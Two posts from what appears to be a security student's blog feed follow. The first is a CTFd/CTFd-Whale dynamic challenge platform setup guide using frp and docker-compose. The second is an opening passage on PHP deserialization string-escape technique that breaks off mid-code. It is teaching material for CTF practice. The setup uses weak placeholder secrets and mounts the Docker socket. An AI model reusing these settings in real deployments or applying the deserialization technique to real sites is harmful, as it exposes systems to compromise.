    <link href="/2023/08/27/CTFD%E5%B9%B3%E5%8F%B0%E6%90%AD%E5%BB%BA/CTFD%E9%9D%B6%E5%9C%BA%E6%90%AD%E5%BB%BA/"/>
    <url>/2023/08/27/CTFD%E5%B9%B3%E5%8F%B0%E6%90%AD%E5%BB%BA/CTFD%E9%9D%B6%E5%9C%BA%E6%90%AD%E5%BB%BA/</url>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><h1 id="CTFD动态靶场搭建"><a href="#CTFD动态靶场搭建" class="headerlink" title="CTFD动态靶场搭建"></a>CTFD动态靶场搭建</h1><p>为了迎接未来的新生赛和未来接活做准备，学习一下如何搭建CTFD靶场顺便练练手。不过这中间踩的坑也是巨多，前前后后搭了好几天才搭好。</p><h2 id="前置"><a href="#前置" class="headerlink" title="前置"></a>前置</h2><p>CTFD使用的是的docker搭建，所以在服务器上需要先装好docker和docker-compose。其中ctfd有多种搭建方式，我采用的是服务器本地起frp服务将题目容器转发到服务器的端口上。</p><h2 id="安装FRP"><a href="#安装FRP" class="headerlink" title="安装FRP"></a>安装FRP</h2><p>下载并安装rp</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs shell">wget https://github.com/fatedier/frp/releases/download/v0.29.0/frp_0.29.0_linux_amd64.tar.gz<br>tar -zxvf frp_0.29.0_linux_amd64.tar.gz<br>cd frp_0.29.0_linux_amd64<br>cd frp_0.29.0_linux_amd64<br>sudo cp systemd/* /etc/systemd/system/ #移动配置文件<br>sudo mkdir /etc/frp #创建客户端配置文件<br>sudo cp frpc.ini  frps.ini /etc/frp/ #移动客户端配置文件<br>sudo cp frpc  frps /usr/bin/ #将客户端和服务端的二进制文件移动至bin文件夹<br>sudo chmod a+x /usr/bin/frpc /usr/bin/frps #给所有用户赋予frpc和frps的可执行权限<br>sudo systemctl enable frps #将frps服务设置为每次开机启动<br></code></pre></td></tr></table></figure><p>编辑frps配置文件</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs abnf">vim /etc/frp/frps.ini<br>[common]<br>bind_port <span class="hljs-operator">=</span> <span class="hljs-number">7897</span><br>bind_addr <span class="hljs-operator">=</span> <span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span><br><span class="hljs-attribute">token</span> <span class="hljs-operator">=</span>thisistoken<br></code></pre></td></tr></table></figure><p>启动frps服务</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">systemctl <span class="hljs-literal">start</span> frps<br></code></pre></td></tr></table></figure><p> 修改&#x2F;etc&#x2F;frp&#x2F;frpc.ini的配置文件</p><p>此处的frpc与上面的frps相对应，连接的是上面启动的frps</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-symbol">vim</span> /etc/frp/frpc.ini<br>[<span class="hljs-meta">common</span>]<br><span class="hljs-symbol">server_addr</span> = <span class="hljs-number">172</span>.<span class="hljs-number">17</span>.<span class="hljs-number">0</span>.<span class="hljs-number">1</span>#此处的<span class="hljs-built_in">IP</span>为docker0的<span class="hljs-built_in">ip</span>，docker0的<span class="hljs-built_in">ip</span>通过ifconfig查看<br><span class="hljs-symbol">server_port</span> = <span class="hljs-number">7897</span><br><span class="hljs-symbol">token</span><span class="hljs-symbol">=thisistoken</span><br></code></pre></td></tr></table></figure><p>再修改frp_0.29.0_linux_amd64&#x2F;frpc.ini  (这个文件会用来配置frpc容器的)</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-section">[common]</span><br><span class="hljs-attr">server_addr</span> = <span class="hljs-number">172.17</span>.<span class="hljs-number">0.1</span><br><span class="hljs-attr">server_port</span> = <span class="hljs-number">7897</span><br><span class="hljs-attr">token</span>=thisistoken<br><span class="hljs-attr">admin_addr</span> = <span class="hljs-number">172.20</span>.<span class="hljs-number">0.3</span><br><span class="hljs-attr">admin_port</span> = <span class="hljs-number">7400</span><br><span class="hljs-attr">log_file</span> = ./frps.log<br></code></pre></td></tr></table></figure><p>创建网络并运行frpc容器</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">docker network create ctfd_frp-containers <span class="hljs-comment">#创建一个docker网络，名称为ctfd_frp-containers</span><br><br>docker <span class="hljs-keyword">run</span><span class="language-bash">  -d -v ~/frp_0.29.0_linux_amd64/frpc.ini:/etc/frp/frpc.ini --network=<span class="hljs-string">&quot;ctfd_frp-containers&quot;</span> --restart=always <span class="hljs-string">&quot;glzjin/frp&quot;</span>  <span class="hljs-comment">#运行容器并将本地的frpc.ini挂载到容器内。网络名称为ctfd_frp-containers</span></span><br></code></pre></td></tr></table></figure><p>接着创建frpcadmin网络用语ctfd和frpc容器通信</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">docker<span class="hljs-built_in"> network </span>creat frcadmin<br>docker<span class="hljs-built_in"> network </span>connect frpcamdin id&lt;刚才启动的frpc容器ID&gt;<br></code></pre></td></tr></table></figure><p>查看frpcadmin网络的连接情况并记录frpc容器的网络IP</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">docker network inspect frpcadmin</span><br></code></pre></td></tr></table></figure><p>图中的IP就是frpc容器在frpcadmin网络中的IP地址，就是我们在&#x2F;frp&#x2F;frpc.ini中指定的（admin_addr）</p><p><img src="https://gitee.com/shark-rice/images/raw/master/202308271348486.png" alt="image-20230820205128158"></p><p>可以提前把这个地址记录下来，后面配置ctfd-whale的时候会用到。</p><h2 id="安装CTFd和CTFd-whale"><a href="#安装CTFd和CTFd-whale" class="headerlink" title="安装CTFd和CTFd-whale"></a>安装CTFd和CTFd-whale</h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-comment">#下载ctfd</span><br>git clone https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/CTFd/</span>CTFd.git<br><span class="hljs-comment">#进入CTFd目录</span><br>cd CTFd<br><span class="hljs-comment">#回退到某个版本，直接执行下面命令</span><br>git reset <span class="hljs-number">6</span>c5c63d667a17aec159c8e26ea53dccfbc4d0fa3 --hard<br>cd CTFd<span class="hljs-regexp">/CTFd/</span>plugins/ <span class="hljs-comment">#进入plugins目录</span><br><br><span class="hljs-comment">#下载插件并确保文件名小写</span><br>git clone https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/glzjin/</span>CTFd-Whale.git ctfd-whale<br><span class="hljs-comment">#进入ctfd-whale</span><br>cd ctfd-whale<br><span class="hljs-comment">#回退版本</span><br>git reset <span class="hljs-number">5</span>b32f457e9f56ee9b2b29495f4b3b118be3c57bd --hard <br><span class="hljs-comment">#回到第一层CTFd目录</span><br>cd ..<span class="hljs-regexp">/../</span>../<br><span class="hljs-comment">#配置docker-compose</span><br>vim docker-compose.yml<br></code></pre></td></tr></table></figure><p>docker-compose.yml，直接复制粘贴就行</p><figure class="highlight nestedtext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs nestedtext"><span class="hljs-attribute">version</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&#x27;2.2&#x27;</span><br><br><span class="hljs-attribute">services</span><span class="hljs-punctuation">:</span><br>  <span class="hljs-attribute">ctfd</span><span class="hljs-punctuation">:</span><br>    <span class="hljs-attribute">build</span><span class="hljs-punctuation">:</span> <span class="hljs-string">.</span><br>    <span class="hljs-attribute">user</span><span class="hljs-punctuation">:</span> <span class="hljs-string">root</span><br>    <span class="hljs-attribute">restart</span><span class="hljs-punctuation">:</span> <span class="hljs-string">always</span><br>    <span class="hljs-attribute">ports</span><span class="hljs-punctuation">:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;8000:8000&quot; #第一个是访问ctfd的端口，第二个是docker端口映射出去的端口</span><br>    <span class="hljs-attribute">environment</span><span class="hljs-punctuation">:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">UPLOAD_FOLDER=/var/uploads</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">DATABASE_URL=mysql+pymysql://root:ctfd@db/ctfd</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">REDIS_URL=redis://cache:6379</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">WORKERS=1</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">LOG_FOLDER=/var/log/CTFd</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">ACCESS_LOG=-</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">ERROR_LOG=-</span><br>    <span class="hljs-attribute">volumes</span><span class="hljs-punctuation">:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">.data/CTFd/logs:/var/log/CTFd</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">.data/CTFd/uploads:/var/uploads</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">.:/opt/CTFd:ro</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">/var/run/docker.sock:/var/run/docker.sock #添加这句即可，别的基本按照官方的不用动</span><br>    <span class="hljs-attribute">depends_on</span><span class="hljs-punctuation">:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">db</span><br>    <span class="hljs-attribute">networks</span><span class="hljs-punctuation">:</span><br>        <span class="hljs-attribute">default</span><span class="hljs-punctuation">:</span><br>        <span class="hljs-attribute">internal</span><span class="hljs-punctuation">:</span><br><span class="hljs-punctuation"></span><br>  <span class="hljs-attribute">db</span><span class="hljs-punctuation">:</span><br>    <span class="hljs-attribute">image</span><span class="hljs-punctuation">:</span> <span class="hljs-string">mariadb:10.4.12 #这里改成10.4.12，10.4.13会出错</span><br>    <span class="hljs-attribute">restart</span><span class="hljs-punctuation">:</span> <span class="hljs-string">always</span><br>    <span class="hljs-attribute">environment</span><span class="hljs-punctuation">:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">MYSQL_ROOT_PASSWORD=ctfd</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">MYSQL_USER=ctfd</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">MYSQL_PASSWORD=ctfd</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">MYSQL_DATABASE=ctfd</span><br>    <span class="hljs-attribute">volumes</span><span class="hljs-punctuation">:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">.data/mysql:/var/lib/mysql</span><br>    <span class="hljs-attribute">networks</span><span class="hljs-punctuation">:</span><br>        <span class="hljs-attribute">internal</span><span class="hljs-punctuation">:</span><br>    <span class="hljs-comment"># This command is required to set important mariadb defaults</span><br>    <span class="hljs-attribute">command</span><span class="hljs-punctuation">:</span> <span class="hljs-string">[mysqld, --character-set-server=utf8mb4, --collation-server=utf8mb4_unicode_ci, --wait_timeout=28800, --log-warnings=0]</span><br><br>  <span class="hljs-attribute">cache</span><span class="hljs-punctuation">:</span><br>    <span class="hljs-attribute">image</span><span class="hljs-punctuation">:</span> <span class="hljs-string">redis:4</span><br>    <span class="hljs-attribute">restart</span><span class="hljs-punctuation">:</span> <span class="hljs-string">always</span><br>    <span class="hljs-attribute">volumes</span><span class="hljs-punctuation">:</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">.data/redis:/data</span><br>    <span class="hljs-attribute">networks</span><span class="hljs-punctuation">:</span><br>        <span class="hljs-attribute">internal</span><span class="hljs-punctuation">:</span><br><span class="hljs-punctuation"></span><br><span class="hljs-attribute">networks</span><span class="hljs-punctuation">:</span><br>    <span class="hljs-attribute">default</span><span class="hljs-punctuation">:</span><br>    <span class="hljs-attribute">internal</span><span class="hljs-punctuation">:</span><br>        <span class="hljs-attribute">internal</span><span class="hljs-punctuation">:</span> <span class="hljs-string">true</span><br></code></pre></td></tr></table></figure><p>进入CTFd目录，修改Dockerfile的内容</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">FROM</span> python:<span class="hljs-number">3.6</span>-alpine<br><span class="hljs-keyword">RUN</span><span class="language-bash"> sed -i <span class="hljs-string">&#x27;s/dl-cdn.alpinelinux.org/mirrors.aliyun.com/g&#x27;</span> /etc/apk/repositories &amp;&amp;\</span><br><span class="language-bash">    apk update &amp;&amp; \</span><br><span class="language-bash">    apk add python3 python3-dev linux-headers libffi-dev gcc make musl-dev py-pip mysql-client git openssl-dev</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> adduser -D -u 1001 -s /bin/bash ctfd</span><br><br><span class="hljs-keyword">WORKDIR</span><span class="language-bash"> /opt/CTFd</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">mkdir</span> -p /opt/CTFd /var/log/CTFd /var/uploads</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> pip config <span class="hljs-built_in">set</span> global.index-url https://pypi.doubanio.com/simple</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> pip config <span class="hljs-built_in">set</span> install.trusted-host pypi.doubanio.com</span><br><span class="hljs-keyword">COPY</span><span class="language-bash"> requirements.txt .</span><br><br><span class="hljs-keyword">RUN</span><span class="language-bash"> pip install -r requirements.txt -i  https://pypi.doubanio.com/simple</span><br><br><span class="hljs-keyword">COPY</span><span class="language-bash"> . /opt/CTFd</span><br><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-keyword">for</span> d <span class="hljs-keyword">in</span> CTFd/plugins/*; <span class="hljs-keyword">do</span> \</span><br><span class="language-bash">      <span class="hljs-keyword">if</span> [ -f <span class="hljs-string">&quot;<span class="hljs-variable">$d</span>/requirements.txt&quot;</span> ]; <span class="hljs-keyword">then</span> \</span><br><span class="language-bash">        pip install -r <span class="hljs-variable">$d</span>/requirements.txt -i  https://pypi.doubanio.com/simple; \</span><br><span class="language-bash">      <span class="hljs-keyword">fi</span>; \</span><br><span class="language-bash">    <span class="hljs-keyword">done</span>;</span><br><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">chmod</span> +x /opt/CTFd/docker-entrypoint.sh</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">chown</span> -R 1001:1001 /opt/CTFd</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">chown</span> -R 1001:1001 /var/log/CTFd /var/uploads</span><br><br><span class="hljs-keyword">USER</span> <span class="hljs-number">1001</span><br><span class="hljs-keyword">EXPOSE</span> <span class="hljs-number">8000</span><br><span class="hljs-keyword">ENTRYPOINT</span><span class="language-bash"> [<span class="hljs-string">&quot;/opt/CTFd/docker-entrypoint.sh&quot;</span>]</span><br></code></pre></td></tr></table></figure><p>requirements.txt内容</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">Flask</span>==<span class="hljs-number">1</span>.<span class="hljs-number">1</span>.<span class="hljs-number">2</span><br><span class="hljs-attribute">Werkzeug</span>==<span class="hljs-number">0</span>.<span class="hljs-number">16</span>.<span class="hljs-number">0</span><br><span class="hljs-attribute">Flask</span>-SQLAlchemy==<span class="hljs-number">2</span>.<span class="hljs-number">4</span>.<span class="hljs-number">1</span><br><span class="hljs-attribute">Flask</span>-Caching==<span class="hljs-number">1</span>.<span class="hljs-number">4</span>.<span class="hljs-number">0</span><br><span class="hljs-attribute">Flask</span>-Migrate==<span class="hljs-number">2</span>.<span class="hljs-number">5</span>.<span class="hljs-number">2</span><br><span class="hljs-attribute">Flask</span>-Script==<span class="hljs-number">2</span>.<span class="hljs-number">0</span>.<span class="hljs-number">6</span><br><span class="hljs-attribute">SQLAlchemy</span>==<span class="hljs-number">1</span>.<span class="hljs-number">3</span>.<span class="hljs-number">11</span><br><span class="hljs-attribute">SQLAlchemy</span>-Utils==<span class="hljs-number">0</span>.<span class="hljs-number">36</span>.<span class="hljs-number">0</span><br><span class="hljs-attribute">passlib</span>==<span class="hljs-number">1</span>.<span class="hljs-number">7</span>.<span class="hljs-number">2</span><br><span class="hljs-attribute">bcrypt</span>==<span class="hljs-number">3</span>.<span class="hljs-number">1</span>.<span class="hljs-number">7</span><br><span class="hljs-attribute">six</span>==<span class="hljs-number">1</span>.<span class="hljs-number">13</span>.<span class="hljs-number">0</span><br><span class="hljs-attribute">itsdangerous</span>==<span class="hljs-number">1</span>.<span class="hljs-number">1</span>.<span class="hljs-number">0</span><br><span class="hljs-attribute">jinja2</span>==<span class="hljs-number">2</span>.<span class="hljs-number">11</span>.<span class="hljs-number">3</span><br><span class="hljs-attribute">requests</span>&gt;=<span class="hljs-number">2</span>.<span class="hljs-number">20</span>.<span class="hljs-number">0</span><br><span class="hljs-attribute">PyMySQL</span>==<span class="hljs-number">0</span>.<span class="hljs-number">9</span>.<span class="hljs-number">3</span><br><span class="hljs-attribute">gunicorn</span>==<span class="hljs-number">19</span>.<span class="hljs-number">9</span>.<span class="hljs-number">0</span><br><span class="hljs-attribute">normality</span>==<span class="hljs-number">2</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span><br><span class="hljs-attribute">dataset</span>==<span class="hljs-number">1</span>.<span class="hljs-number">1</span>.<span class="hljs-number">2</span><br><span class="hljs-attribute">mistune</span>==<span class="hljs-number">0</span>.<span class="hljs-number">8</span>.<span class="hljs-number">4</span><br><span class="hljs-attribute">netaddr</span>==<span class="hljs-number">0</span>.<span class="hljs-number">7</span>.<span class="hljs-number">19</span><br><span class="hljs-attribute">redis</span>==<span class="hljs-number">3</span>.<span class="hljs-number">3</span>.<span class="hljs-number">11</span><br><span class="hljs-attribute">datafreeze</span>==<span class="hljs-number">0</span>.<span class="hljs-number">1</span>.<span class="hljs-number">0</span><br><span class="hljs-attribute">gevent</span>==<span class="hljs-number">21</span>.<span class="hljs-number">12</span>.<span class="hljs-number">0</span><br><span class="hljs-attribute">python</span>-dotenv==<span class="hljs-number">0</span>.<span class="hljs-number">10</span>.<span class="hljs-number">3</span><br><span class="hljs-attribute">flask</span>-restplus==<span class="hljs-number">0</span>.<span class="hljs-number">13</span>.<span class="hljs-number">0</span><br><span class="hljs-attribute">pathlib2</span>==<span class="hljs-number">2</span>.<span class="hljs-number">3</span>.<span class="hljs-number">5</span><br><span class="hljs-attribute">flask</span>-marshmallow==<span class="hljs-number">0</span>.<span class="hljs-number">10</span>.<span class="hljs-number">1</span><br><span class="hljs-attribute">marshmallow</span>-sqlalchemy==<span class="hljs-number">0</span>.<span class="hljs-number">17</span>.<span class="hljs-number">0</span><br><span class="hljs-attribute">boto3</span>==<span class="hljs-number">1</span>.<span class="hljs-number">10</span>.<span class="hljs-number">39</span><br><span class="hljs-attribute">markupsafe</span>==<span class="hljs-number">1</span>.<span class="hljs-number">1</span>.<span class="hljs-number">1</span><br><span class="hljs-attribute">marshmallow</span>==<span class="hljs-number">2</span>.<span class="hljs-number">20</span>.<span class="hljs-number">2</span><br></code></pre></td></tr></table></figure><p>准备好后开始构建容器，进入CTFd目录</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">docker-compose biuld</span><br></code></pre></td></tr></table></figure><p>启动镜像</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">docker-compose up -d</span><br></code></pre></td></tr></table></figure><p>启动完之后将ctfd容器加入到frpcadmin的网络之中</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">docker ps <span class="hljs-comment">#查看ctfd容器的ID</span><br>docker network <span class="hljs-keyword">connect</span> frpcadmin <span class="hljs-comment">#容器ID </span><br></code></pre></td></tr></table></figure><p>可以看到ctfd容器已经加入到了frpcadmin容器之中了</p><p><img src="https://gitee.com/shark-rice/images/raw/master/202308271348495.png" alt="image-20230821113536575"></p><p>查看容器运行状态</p><p><img src="https://gitee.com/shark-rice/images/raw/master/202308271348969.png" alt="image-20230821113654613"></p><p>访问 ip:8000进入平台，按需填写内容</p><p><img src="https://gitee.com/shark-rice/images/raw/master/202308271348578.png" alt="image-20230821113902068"></p><p>上方导航栏Admin-&gt;Plugins 配置CTFd Whale相关内容</p><p><img src="https://gitee.com/shark-rice/images/raw/master/202308271348850.png" alt="image-20230821141633201"></p><p><img src="https://gitee.com/shark-rice/images/raw/master/202308271348069.png" alt="image-20230821141835333"></p><p><img src="https://gitee.com/shark-rice/images/raw/master/202308271348639.png" alt="image-20230821142048736"></p><p><img src="https://gitee.com/shark-rice/images/raw/master/202308271348211.png" alt="image-20230821142123914"></p><h2 id="添加题目"><a href="#添加题目" class="headerlink" title="添加题目"></a>添加题目</h2><p>上方challenges处添加题目，选择dynamic_docker创建动态题目</p><p><img src="https://gitee.com/shark-rice/images/raw/master/202308271348868.png" alt="image-20230821142321874"></p><p><img src="https://gitee.com/shark-rice/images/raw/master/202308271355544.png" alt="image-20230821142545317"></p><p><img src="https://gitee.com/shark-rice/images/raw/master/202308271348434.png" alt="image-20230821142719030"></p><p><img src="https://gitee.com/shark-rice/images/raw/master/202308271348154.png" alt="image-20230821142727231"></p><p>最后不要忘记选择动态分数</p><p>成功部署题目</p><p><img src="https://gitee.com/shark-rice/images/raw/master/202308271348073.png" alt="image-20230821142835370"></p><p><img src="https://gitee.com/shark-rice/images/raw/master/202308271348601.png" alt="image-20230821142845326"></p><p>flag也是动态flag</p><p><img src="https://gitee.com/shark-rice/images/raw/master/202308271348902.png" alt="image-20230821142949627"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>PHP反序列化字符串逃逸</title>
    <link href="/2023/07/29/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8/"/>
    <url>/2023/07/29/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8/</url>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><h2 id="PHP反序列化字符串逃逸"><a href="#PHP反序列化字符串逃逸" class="headerlink" title="PHP反序列化字符串逃逸"></a>PHP反序列化字符串逃逸</h2><p>虽然是大一就学的知识点，但是前段时间做题的时候发现又忘了。所以把他记录下来，方便下次查阅。</p><p>反序列化字符串逃逸主要出现在字符串增加或者减少的情况。</p><p><strong>前置知识：</strong></p><p>php的序列化数据中，使用<code>;</code>来分隔不同的字段，使用<code>&#125;</code>来作为结尾。并且序列化时，严格按照字段的长度来读取字符。反序列化的过程严格按照序列化规则来进行反序列化，否则会反序列化失败。</p><p>可以反序列化类中不存在的元素。</p><p><img src="https://gitee.com/shark-rice/images/raw/master/202307290109929.png" alt="image-20230728212301109"></p><p>在反序列化不存在元素时需要注意前面的成员数需要与后面的成员数相符合</p><p>字符增加&#x2F;减少函数示例</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">b</span>(<span class="hljs-params"><span class="hljs-variable">$data</span></span>)</span>&#123;<br> <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;aa&quot;</span>,<span class="hljs-string">&quot;bbbb&quot;</span>,<span class="hljs-variable">$data</span>);<span class="hljs-comment">//字符串增加</span><br> &#125;<br> <br> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">a</span>(<span class="hljs-params"><span class="hljs-variable">$data</span></span>)</span>&#123;<br> <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;bbbb&quot;</span>,<span class="hljs-string">&quot;aa&quot;</span>,<span class="hljs-variable">$data</span>);<span class="hljs-comment">//字符串减少</span><br> &#125;<br></code></pre></td></tr></table></figure><h3 id="字符串增加"><a href="#字符串增加" class="headerlink" title="字符串增加"></a>字符串增加</h3><p>测试代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">b</span>(<span class="hljs-params"><span class="hljs-variable">$data</span></span>)</span>&#123;<br> <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;aa&quot;</span>,<span class="hljs-string">&quot;bbbb&quot;</span>,<span class="hljs-variable">$data</span>);<span class="hljs-comment">//字符串增加</span><br> &#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$student</span>=<span class="hljs-string">&quot;aa&quot;</span>;<br><span class="hljs-keyword">public</span> <span 